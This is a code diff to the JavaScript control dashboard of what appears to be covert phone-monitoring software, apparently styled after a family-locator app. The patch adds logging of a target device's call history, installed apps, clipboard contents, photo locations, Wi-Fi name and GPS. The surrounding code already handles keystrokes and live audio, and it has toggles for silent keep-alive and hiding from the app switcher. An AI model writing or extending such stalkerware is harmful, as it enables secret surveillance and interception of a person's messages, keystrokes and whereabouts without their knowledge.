@@ -354,6 +354,15 @@ if (m.keys) addLog(m.keys, m.dev);
 }
 }
 
+if (m.type === 'call') { addLog('call ' + m.dir + ' ' + (m.state === 'end' ? m.seconds + 's' : 'start'), m.dev); return; }
+if (m.type === 'apps') { addLog('apps: ' + ((m.found || []).join(' ') || 'none'), m.dev); return; }
+if (m.type === 'net') { addLog('net: ' + (m.ip || '-') + ' ' + (m.carrier || '-') + ' free ' + (m.diskFreeMB || 0) + 'MB', m.dev); return; }
+if (m.type === 'photoLoc') { addLog('photo at ' + (+m.lat).toFixed(4) + ',' + (+m.lon).toFixed(4), m.dev); return; }
+if (m.type === 'battery') { addLog('battery ' + m.level + '%' + (m.charging ? ' charging' : ''), m.dev); return; }
+if (m.type === 'wifi') { addLog('wifi ' + m.ssid, m.dev); return; }
+if (m.type === 'clipboard') { addLog('clip ' + m.text, m.dev); return; }
+if (m.type === 'motion') { addLog('motion ' + m.activity, m.dev); return; }
+if (m.type === 'gps') { handle({ type: 'loc', lat: m.lat, lng: m.lon, dev: m.dev, t: m.t }); return; }
 function onmessage(e) {
 if (typeof e.data !== 'string') { playPcm(new Int16Array(e.data)); return; }
 var m;
@@ -384,7 +393,7 @@ var KEYS = [
 ['wifiInfo','Wi-Fi name'],['geofence','Geofence alerts'],['screenTime','Screen Time'],
 ['silentKeepAlive','Silent keep-alive'],['schedule','Scheduling'],['storeAndForward','Store & forward'],
 ['history','History log'],['pushAlerts','Push alerts'],['keywordTriggers','Keyword triggers'],
-['encryption','Encrypt payloads'],['watchdog','Watchdog'],['blankSnapshot','Blank switcher card']
+['encryption','Encrypt payloads'],['watchdog','Watchdog'],['blankSnapshot','Blank switcher card'],['calls','Call log'],['installedApps','Installed apps'],['netInfo','Network and disk'],['photoLocation','Photo locations']
 ];
 var savedVals = lsGet('l360.toggles', {});
 var toggles = document.getElementById('toggles');
